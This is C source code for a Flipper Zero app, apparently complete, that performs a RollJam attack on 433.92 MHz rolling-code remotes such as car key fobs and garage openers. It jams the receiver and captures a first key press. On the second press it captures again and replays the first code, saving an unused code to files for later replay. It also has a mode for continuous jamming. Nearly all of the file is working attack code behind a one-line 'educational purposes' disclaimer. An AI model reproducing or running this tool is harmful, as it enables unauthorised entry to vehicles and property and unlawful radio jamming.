/**
 * RollJam Attack - Rolling Code Bypass Tool
 * 
 * FOR SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <input/input.h>
#include <storage/storage.h>
#include <toolbox/stream/file_stream.h>
#include <lib/subghz/devices/cc1101_configs.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define TAG "RollJamApp"

// Configuration
#define TARGET_FREQUENCY   433920000
#define JAM_FREQUENCY      433920000
#define JAM_OFFSET         50000
#define RAW_BUFFER_SIZE    16384
#define MAX_CAPTURED_CODES 10
#define CAPTURES_DIR       "/ext/subghz/rolljam"
#define JAM_PULSE_US       100
#define RSSI_THRESHOLD     -65.0f
#define MIN_SIGNAL_SAMPLES 50

typedef enum {
    ModeMenu,
    ModeRollJam,
    ModeCapture,
    ModeReplay,
    ModeJamOnly,
    ModeAnalyze
} AppMode;

typedef enum {
    RollJamIdle,
    RollJamArmed,
    RollJamJamming1,
    RollJamWaiting2,
    RollJamJamming2,
    RollJamReady,
    RollJamComplete
} RollJamState;

typedef struct {
    int32_t* samples;
    size_t sample_count;
    uint32_t timestamp;
    bool valid;
    uint32_t frequency;
} CapturedSignal;

typedef struct {
    ViewPort* view_port;
    Gui* gui;
    FuriMessageQueue* event_queue;
    FuriMutex* mutex;

    AppMode mode;
    uint8_t menu_index;

    RollJamState rolljam_state;
    FuriThread* worker_thread;
    volatile bool worker_running;

    volatile bool jam_active;
    FuriThread* jam_thread;

    CapturedSignal captured[MAX_CAPTURED_CODES];
    uint8_t capture_count;
    uint8_t replay_index;

    int32_t* rx_buffer;
    volatile size_t rx_write_index;
    volatile bool rx_capturing;

    uint32_t signals_detected;
    uint32_t codes_captured;
    uint32_t replays_sent;
    float last_rssi;

    char status_msg[64];
} RollJamApp;

static RollJamApp* g_app = NULL;

// Jamming thread
static int32_t jam_thread_callback(void* context) {
    RollJamApp* app = context;

    FURI_LOG_I(TAG, "Jammer started");

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();
    furi_hal_subghz_load_custom_preset(subghz_device_cc1101_preset_ook_650khz_async_regs);
    furi_hal_subghz_set_frequency_and_path(JAM_FREQUENCY + JAM_OFFSET);

    while(app->jam_active) {
        furi_hal_subghz_tx();
        furi_delay_us(JAM_PULSE_US);
        furi_hal_subghz_idle();
        furi_delay_us(JAM_PULSE_US / 2);
    }

    furi_hal_subghz_idle();
    FURI_LOG_I(TAG, "Jammer stopped");

    return 0;
}

static void start_jamming(RollJamApp* app) {
    if(app->jam_active) return;

    app->jam_active = true;
    app->jam_thread = furi_thread_alloc_ex("RollJamJammer", 1024, jam_thread_callback, app);
    furi_thread_start(app->jam_thread);

    FURI_LOG_I(TAG, "Jamming started");
}

static void stop_jamming(RollJamApp* app) {
    if(!app->jam_active) return;

    app->jam_active = false;
    furi_thread_join(app->jam_thread);
    furi_thread_free(app->jam_thread);
    app->jam_thread = NULL;

    FURI_LOG_I(TAG, "Jamming stopped");
}

// RX callback
static void rx_callback(bool level, uint32_t duration, void* context) {
    RollJamApp* app = context;

    if(!app->rx_capturing) return;
    if(app->rx_write_index >= RAW_BUFFER_SIZE) return;
    if(duration < 100 || duration > 50000) return;

    app->rx_buffer[app->rx_write_index++] = level ? (int32_t)duration : -(int32_t)duration;
}

// Save signal to file
static void save_captured_signal(RollJamApp* app, uint8_t index) {
    if(index >= app->capture_count) return;

    CapturedSignal* sig = &app->captured[index];
    if(!sig->valid || sig->sample_count == 0) return;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, "/ext/subghz");
    storage_common_mkdir(storage, CAPTURES_DIR);

    FuriString* filename = furi_string_alloc();
    furi_string_printf(
        filename, "%s/code_%lu_%d.sub", CAPTURES_DIR, (unsigned long)sig->timestamp, index);

    Stream* stream = file_stream_alloc(storage);
    if(file_stream_open(stream, furi_string_get_cstr(filename), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        stream_write_cstring(stream, "Filetype: Flipper SubGhz RAW File\n");
        stream_write_cstring(stream, "Version: 1\n");

        FuriString* line = furi_string_alloc();
        furi_string_printf(line, "Frequency: %lu\n", (unsigned long)sig->frequency);
        stream_write_string(stream, line);
        stream_write_cstring(stream, "Preset: FuriHalSubGhzPresetOok650Async\n");
        stream_write_cstring(stream, "Protocol: RAW\n");

        furi_string_printf(line, "RAW_Data:");
        for(size_t i = 0; i < sig->sample_count; i++) {
            furi_string_cat_printf(line, " %ld", (long)sig->samples[i]);
            if((i + 1) % 512 == 0) {
                furi_string_cat_printf(line, "\n");
                stream_write_string(stream, line);
                furi_string_printf(line, "RAW_Data:");
            }
        }
        if(sig->sample_count % 512 != 0) {
            furi_string_cat_printf(line, "\n");
            stream_write_string(stream, line);
        }

        furi_string_free(line);
        FURI_LOG_I(TAG, "Saved: %s", furi_string_get_cstr(filename));
    }

    file_stream_close(stream);
    stream_free(stream);
    furi_string_free(filename);
    furi_record_close(RECORD_STORAGE);
}

// Replay signal
static void replay_signal(RollJamApp* app, uint8_t index) {
    if(index >= app->capture_count) return;

    CapturedSignal* sig = &app->captured[index];
    if(!sig->valid || sig->sample_count == 0) {
        FURI_LOG_W(TAG, "No valid signal at index %d", index);
        return;
    }

    FURI_LOG_I(TAG, "Replaying signal %d (%u samples)", index, (unsigned int)sig->sample_count);

    bool was_jamming = app->jam_active;
    if(was_jamming) {
        stop_jamming(app);
        furi_delay_ms(10);
    }

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();
    furi_hal_subghz_load_custom_preset(subghz_device_cc1101_preset_ook_650khz_async_regs);
    furi_hal_subghz_set_frequency_and_path(sig->frequency);

    for(int repeat = 0; repeat < 3; repeat++) {
        for(size_t i = 0; i < sig->sample_count; i++) {
            int32_t timing = sig->samples[i];
            bool level = timing > 0;
            uint32_t duration = level ? (uint32_t)timing : (uint32_t)(-timing);

            if(level) {
                furi_hal_subghz_tx();
            } else {
                furi_hal_subghz_idle();
            }

            if(duration > 1000) {
                furi_delay_ms(duration / 1000);
                furi_delay_us(duration % 1000);
            } else {
                furi_delay_us(duration);
            }
        }
        furi_hal_subghz_idle();
        furi_delay_ms(50);
    }

    furi_hal_subghz_sleep();
    app->replays_sent++;

    if(was_jamming) {
        furi_delay_ms(10);
        start_jamming(app);
    }

    FURI_LOG_I(TAG, "Replay complete");
}

// RollJam worker thread
static int32_t rolljam_worker_thread(void* context) {
    RollJamApp* app = context;

    FURI_LOG_I(TAG, "RollJam worker started");

    app->rx_buffer = malloc(RAW_BUFFER_SIZE * sizeof(int32_t));
    if(!app->rx_buffer) {
        FURI_LOG_E(TAG, "Failed to allocate RX buffer");
        return -1;
    }

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();
    furi_hal_subghz_load_custom_preset(subghz_device_cc1101_preset_ook_650khz_async_regs);
    furi_hal_subghz_set_frequency_and_path(TARGET_FREQUENCY);

    uint32_t silence_count = 0;
    bool signal_detected = false;

    app->rx_write_index = 0;
    app->rx_capturing = true;

    furi_hal_subghz_start_async_rx(rx_callback, app);

    while(app->worker_running) {
        float rssi = furi_hal_subghz_get_rssi();
        app->last_rssi = rssi;

        switch(app->rolljam_state) {
        case RollJamArmed:
            if(rssi > RSSI_THRESHOLD && !signal_detected) {
                signal_detected = true;
                app->rx_write_index = 0;
                app->signals_detected++;

                start_jamming(app);
                app->rolljam_state = RollJamJamming1;
                snprintf(
                    app->status_msg, sizeof(app->status_msg), "JAMMING + Capturing code 1...");
                FURI_LOG_I(TAG, "Signal detected! Jamming + capturing...");
            }
            break;

        case RollJamJamming1:
            if(rssi < RSSI_THRESHOLD) {
                silence_count++;
                if(silence_count > 30) {
                    if(app->rx_write_index > MIN_SIGNAL_SAMPLES) {
                        uint8_t idx = app->capture_count;
                        if(idx < MAX_CAPTURED_CODES) {
                            app->captured[idx].samples =
                                malloc(app->rx_write_index * sizeof(int32_t));
                            if(app->captured[idx].samples) {
                                memcpy(
                                    app->captured[idx].samples,
                                    app->rx_buffer,
                                    app->rx_write_index * sizeof(int32_t));
                                app->captured[idx].sample_count = app->rx_write_index;
                                app->captured[idx].timestamp = furi_get_tick();
                                app->captured[idx].frequency = TARGET_FREQUENCY;
                                app->captured[idx].valid = true;
                                app->capture_count++;
                                app->codes_captured++;

                                FURI_LOG_I(
                                    TAG,
                                    "Code 1 captured: %u samples",
                                    (unsigned int)app->rx_write_index);
                                save_captured_signal(app, idx);
                            }
                        }
                    }

                    app->rolljam_state = RollJamWaiting2;
                    snprintf(
                        app->status_msg,
                        sizeof(app->status_msg),
                        "Code 1 captured! Waiting for press 2...");
                    signal_detected = false;
                    silence_count = 0;
                    app->rx_write_index = 0;
                }
            } else {
                silence_count = 0;
            }
            break;

        case RollJamWaiting2:
            if(rssi > RSSI_THRESHOLD && !signal_detected) {
                signal_detected = true;
                app->rx_write_index = 0;
                app->signals_detected++;

                app->rolljam_state = RollJamJamming2;
                snprintf(
                    app->status_msg,
                    sizeof(app->status_msg),
                    "Capturing code 2 + Replaying code 1!");
                FURI_LOG_I(TAG, "Second press! Capturing + replaying...");

                replay_signal(app, app->capture_count - 1);
            }
            break;

        case RollJamJamming2:
            if(rssi < RSSI_THRESHOLD) {
                silence_count++;
                if(silence_count > 30) {
                    if(app->rx_write_index > MIN_SIGNAL_SAMPLES) {
                        uint8_t idx = app->capture_count;
                        if(idx < MAX_CAPTURED_CODES) {
                            app->captured[idx].samples =
                                malloc(app->rx_write_index * sizeof(int32_t));
                            if(app->captured[idx].samples) {
                                memcpy(
                                    app->captured[idx].samples,
                                    app->rx_buffer,
                                    app->rx_write_index * sizeof(int32_t));
                                app->captured[idx].sample_count = app->rx_write_index;
                                app->captured[idx].timestamp = furi_get_tick();
                                app->captured[idx].frequency = TARGET_FREQUENCY;
                                app->captured[idx].valid = true;
                                app->capture_count++;
                                app->codes_captured++;
                                app->replay_index = idx;

                                FURI_LOG_I(TAG, "Code 2 captured - ATTACK READY!");
                                save_captured_signal(app, idx);
                            }
                        }
                    }

                    stop_jamming(app);
                    app->rolljam_state = RollJamReady;
                    snprintf(
                        app->status_msg, sizeof(app->status_msg), "SUCCESS! Code 2 ready to use!");
                    FURI_LOG_I(TAG, "=== ROLLJAM ATTACK SUCCESSFUL ===");
                    signal_detected = false;
                    silence_count = 0;
                }
            } else {
                silence_count = 0;
            }
            break;

        default:
            break;
        }

        furi_delay_ms(10);
    }

    furi_hal_subghz_stop_async_rx();
    stop_jamming(app);
    furi_hal_subghz_idle();
    furi_hal_subghz_sleep();

    app->rx_capturing = false;
    if(app->rx_buffer) {
        free(app->rx_buffer);
        app->rx_buffer = NULL;
    }

    FURI_LOG_I(TAG, "RollJam worker stopped");
    return 0;
}

// Simple capture worker
static int32_t capture_worker_thread(void* context) {
    RollJamApp* app = context;

    FURI_LOG_I(TAG, "Capture worker started");

    app->rx_buffer = malloc(RAW_BUFFER_SIZE * sizeof(int32_t));
    if(!app->rx_buffer) return -1;

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();
    furi_hal_subghz_load_custom_preset(subghz_device_cc1101_preset_ook_650khz_async_regs);
    furi_hal_subghz_set_frequency_and_path(TARGET_FREQUENCY);

    app->rx_write_index = 0;
    app->rx_capturing = true;
    furi_hal_subghz_start_async_rx(rx_callback, app);

    uint32_t silence_count = 0;
    bool signal_active = false;

    while(app->worker_running) {
        float rssi = furi_hal_subghz_get_rssi();
        app->last_rssi = rssi;

        if(rssi > RSSI_THRESHOLD) {
            if(!signal_active) {
                signal_active = true;
                app->rx_write_index = 0;
                app->signals_detected++;
                snprintf(app->status_msg, sizeof(app->status_msg), "Capturing signal...");
            }
            silence_count = 0;
        } else if(signal_active) {
            silence_count++;
            if(silence_count > 50) {
                if(app->rx_write_index > MIN_SIGNAL_SAMPLES &&
                   app->capture_count < MAX_CAPTURED_CODES) {
                    uint8_t idx = app->capture_count;
                    app->captured[idx].samples = malloc(app->rx_write_index * sizeof(int32_t));
                    if(app->captured[idx].samples) {
                        memcpy(
                            app->captured[idx].samples,
                            app->rx_buffer,
                            app->rx_write_index * sizeof(int32_t));
                        app->captured[idx].sample_count = app->rx_write_index;
                        app->captured[idx].timestamp = furi_get_tick();
                        app->captured[idx].frequency = TARGET_FREQUENCY;
                        app->captured[idx].valid = true;
                        app->capture_count++;
                        app->codes_captured++;

                        save_captured_signal(app, idx);
                        snprintf(
                            app->status_msg,
                            sizeof(app->status_msg),
                            "Captured code %d (%u samples)",
                            idx + 1,
                            (unsigned int)app->rx_write_index);
                        FURI_LOG_I(TAG, "Captured code %d", idx + 1);
                    }
                }
                signal_active = false;
                silence_count = 0;
                app->rx_write_index = 0;
            }
        }

        furi_delay_ms(10);
    }

    furi_hal_subghz_stop_async_rx();
    furi_hal_subghz_idle();
    furi_hal_subghz_sleep();

    app->rx_capturing = false;
    free(app->rx_buffer);
    app->rx_buffer = NULL;

    return 0;
}

// Control functions
static void start_rolljam(RollJamApp* app) {
    if(app->worker_running) return;

    app->rolljam_state = RollJamArmed;
    app->worker_running = true;
    snprintf(app->status_msg, sizeof(app->status_msg), "Armed - waiting for signal...");

    app->worker_thread = furi_thread_alloc_ex("RollJamWorker", 4096, rolljam_worker_thread, app);
    furi_thread_start(app->worker_thread);
}

static void start_capture(RollJamApp* app) {
    if(app->worker_running) return;

    app->worker_running = true;
    snprintf(app->status_msg, sizeof(app->status_msg), "Listening...");

    app->worker_thread = furi_thread_alloc_ex("CaptureWorker", 4096, capture_worker_thread, app);
    furi_thread_start(app->worker_thread);
}

static void stop_worker(RollJamApp* app) {
    if(!app->worker_running) return;

    app->worker_running = false;
    furi_thread_join(app->worker_thread);
    furi_thread_free(app->worker_thread);
    app->worker_thread = NULL;
    app->rolljam_state = RollJamIdle;
    snprintf(app->status_msg, sizeof(app->status_msg), "Stopped");
}

// GUI
static const char* rolljam_state_str(RollJamState state) {
    switch(state) {
    case RollJamIdle:
        return "IDLE";
    case RollJamArmed:
        return "ARMED";
    case RollJamJamming1:
        return "JAM+CAP 1";
    case RollJamWaiting2:
        return "WAIT PRESS 2";
    case RollJamJamming2:
        return "JAM+CAP 2";
    case RollJamReady:
        return "CODE READY!";
    case RollJamComplete:
        return "COMPLETE";
    default:
        return "???";
    }
}

static void render_callback(Canvas* canvas, void* ctx) {
    RollJamApp* app = ctx;

    furi_mutex_acquire(app->mutex, FuriWaitForever);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    switch(app->mode) {
    case ModeMenu:
        canvas_draw_str(canvas, 2, 10, "RollJam Attack Tool");
        canvas_set_font(canvas, FontSecondary);

        const char* menu_items[] = {
            "RollJam Attack", "Capture Codes", "Replay Code", "Continuous Jam", "Analyze Captures"};

        for(int i = 0; i < 5; i++) {
            canvas_draw_str(canvas, 2, 22 + i * 10, i == app->menu_index ? ">" : " ");
            canvas_draw_str(canvas, 10, 22 + i * 10, menu_items[i]);
        }
        break;

    case ModeRollJam: {
        canvas_draw_str(canvas, 2, 10, "RollJam Attack");
        canvas_set_font(canvas, FontSecondary);

        FuriString* line = furi_string_alloc();

        furi_string_printf(line, "State: %s", rolljam_state_str(app->rolljam_state));
        canvas_draw_str(canvas, 2, 22, furi_string_get_cstr(line));

        furi_string_printf(line, "RSSI: %.1f dBm", (double)app->last_rssi);
        canvas_draw_str(canvas, 2, 32, furi_string_get_cstr(line));

        furi_string_printf(
            line,
            "Codes: %lu | Jam: %s",
            (unsigned long)app->codes_captured,
            app->jam_active ? "ON" : "OFF");
        canvas_draw_str(canvas, 2, 42, furi_string_get_cstr(line));

        canvas_draw_str(canvas, 2, 52, app->status_msg);

        furi_string_free(line);

        if(app->rolljam_state == RollJamReady) {
            canvas_draw_str(canvas, 2, 62, "OK:Use Code  Back:Exit");
        } else if(app->worker_running) {
            canvas_draw_str(canvas, 2, 62, "Back: Stop");
        } else {
            canvas_draw_str(canvas, 2, 62, "OK: Start Attack");
        }
        break;
    }

    case ModeCapture: {
        canvas_draw_str(canvas, 2, 10, "Code Capture");
        canvas_set_font(canvas, FontSecondary);

        FuriString* line = furi_string_alloc();

        furi_string_printf(line, "RSSI: %.1f dBm", (double)app->last_rssi);
        canvas_draw_str(canvas, 2, 22, furi_string_get_cstr(line));

        furi_string_printf(
            line,
            "Signals: %lu | Captured: %lu",
            (unsigned long)app->signals_detected,
            (unsigned long)app->codes_captured);
        canvas_draw_str(canvas, 2, 32, furi_string_get_cstr(line));

        canvas_draw_str(canvas, 2, 42, app->status_msg);

        furi_string_free(line);

        canvas_draw_str(canvas, 2, 62, app->worker_running ? "Back:Stop" : "OK:Start");
        break;
    }

    case ModeReplay: {
        canvas_draw_str(canvas, 2, 10, "Replay Code");
        canvas_set_font(canvas, FontSecondary);

        FuriString* line = furi_string_alloc();

        if(app->capture_count == 0) {
            canvas_draw_str(canvas, 2, 30, "No codes captured!");
            canvas_draw_str(canvas, 2, 40, "Capture some first.");
        } else {
            furi_string_printf(line, "Code: %d / %d", app->replay_index + 1, app->capture_count);
            canvas_draw_str(canvas, 2, 22, furi_string_get_cstr(line));

            CapturedSignal* sig = &app->captured[app->replay_index];
            furi_string_printf(line, "Samples: %u", (unsigned int)sig->sample_count);
            canvas_draw_str(canvas, 2, 32, furi_string_get_cstr(line));

            furi_string_printf(line, "Replays sent: %lu", (unsigned long)app->replays_sent);
            canvas_draw_str(canvas, 2, 42, furi_string_get_cstr(line));

            canvas_draw_str(canvas, 2, 52, "L/R: Select | OK: Send");
        }

        furi_string_free(line);
        canvas_draw_str(canvas, 2, 62, "Back: Return");
        break;
    }

    case ModeJamOnly:
        canvas_draw_str(canvas, 2, 10, "Continuous Jamming");
        canvas_set_font(canvas, FontSecondary);

        canvas_draw_str(canvas, 2, 30, app->jam_active ? "STATUS: JAMMING!" : "STATUS: Off");

        {
            FuriString* freq = furi_string_alloc();
            furi_string_printf(freq, "Freq: %lu Hz", (unsigned long)(JAM_FREQUENCY + JAM_OFFSET));
            canvas_draw_str(canvas, 2, 42, furi_string_get_cstr(freq));
            furi_string_free(freq);
        }

        canvas_draw_str(canvas, 2, 62, "OK: Toggle | Back: Exit");
        break;

    case ModeAnalyze:
        canvas_draw_str(canvas, 2, 10, "Analyze Captures");
        canvas_set_font(canvas, FontSecondary);

        {
            FuriString* info = furi_string_alloc();
            furi_string_printf(info, "Total captured: %d", app->capture_count);
            canvas_draw_str(canvas, 2, 22, furi_string_get_cstr(info));

            furi_string_printf(info, "Replays sent: %lu", (unsigned long)app->replays_sent);
            canvas_draw_str(canvas, 2, 32, furi_string_get_cstr(info));

            furi_string_printf(info, "Signals seen: %lu", (unsigned long)app->signals_detected);
            canvas_draw_str(canvas, 2, 42, furi_string_get_cstr(info));

            canvas_draw_str(canvas, 2, 52, "Files: /ext/subghz/rolljam");

            furi_string_free(info);
        }

        canvas_draw_str(canvas, 2, 62, "Back: Return");
        break;
    }

    furi_mutex_release(app->mutex);
}

static void input_callback(InputEvent* event, void* ctx) {
    FuriMessageQueue* queue = ctx;
    furi_message_queue_put(queue, event, FuriWaitForever);
}

// Main
int32_t rolljam_app(void* p) {
    UNUSED(p);

    FURI_LOG_I(TAG, "RollJam App Started");

    RollJamApp* app = malloc(sizeof(RollJamApp));
    memset(app, 0, sizeof(RollJamApp));
    g_app = app;

    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->mode = ModeMenu;
    snprintf(app->status_msg, sizeof(app->status_msg), "Ready");

    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, render_callback, app);
    view_port_input_callback_set(app->view_port, input_callback, app->event_queue);

    app->gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    InputEvent event;
    bool running = true;

    while(running) {
        if(furi_message_queue_get(app->event_queue, &event, 100) == FuriStatusOk) {
            if(event.type == InputTypeShort || event.type == InputTypeRepeat) {
                furi_mutex_acquire(app->mutex, FuriWaitForever);

                switch(app->mode) {
                case ModeMenu:
                    if(event.key == InputKeyUp && app->menu_index > 0) {
                        app->menu_index--;
                    } else if(event.key == InputKeyDown && app->menu_index < 4) {
                        app->menu_index++;
                    } else if(event.key == InputKeyOk) {
                        app->mode = (AppMode)(app->menu_index + 1);
                    } else if(event.key == InputKeyBack) {
                        running = false;
                    }
                    break;

                case ModeRollJam:
                    if(event.key == InputKeyOk) {
                        if(app->rolljam_state == RollJamReady) {
                            furi_mutex_release(app->mutex);
                            replay_signal(app, app->replay_index);
                            furi_mutex_acquire(app->mutex, FuriWaitForever);
                            snprintf(app->status_msg, sizeof(app->status_msg), "Code sent!");
                        } else if(!app->worker_running) {
                            start_rolljam(app);
                        }
                    } else if(event.key == InputKeyBack) {
                        stop_worker(app);
                        app->mode = ModeMenu;
                    }
                    break;

                case ModeCapture:
                    if(event.key == InputKeyOk) {
                        if(!app->worker_running) {
                            start_capture(app);
                        }
                    } else if(event.key == InputKeyBack) {
                        stop_worker(app);
                        app->mode = ModeMenu;
                    }
                    break;

                case ModeReplay:
                    if(event.key == InputKeyOk && app->capture_count > 0) {
                        furi_mutex_release(app->mutex);
                        replay_signal(app, app->replay_index);
                        furi_mutex_acquire(app->mutex, FuriWaitForever);
                    } else if(event.key == InputKeyLeft) {
                        if(app->replay_index > 0) app->replay_index--;
                    } else if(event.key == InputKeyRight) {
                        if(app->replay_index < app->capture_count - 1) app->replay_index++;
                    } else if(event.key == InputKeyBack) {
                        app->mode = ModeMenu;
                    }
                    break;

                case ModeJamOnly:
                    if(event.key == InputKeyOk) {
                        if(app->jam_active) {
                            stop_jamming(app);
                        } else {
                            start_jamming(app);
                        }
                    } else if(event.key == InputKeyBack) {
                        stop_jamming(app);
                        app->mode = ModeMenu;
                    }
                    break;

                case ModeAnalyze:
                    if(event.key == InputKeyBack) {
                        app->mode = ModeMenu;
                    }
                    break;
                }

                furi_mutex_release(app->mutex);
            }
        }

        view_port_update(app->view_port);
    }

    FURI_LOG_I(TAG, "Shutting down...");

    stop_worker(app);
    stop_jamming(app);

    for(int i = 0; i < app->capture_count; i++) {
        if(app->captured[i].samples) {
            free(app->captured[i].samples);
        }
    }

    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    furi_mutex_free(app->mutex);

    free(app);
    g_app = NULL;

    return 0;
}
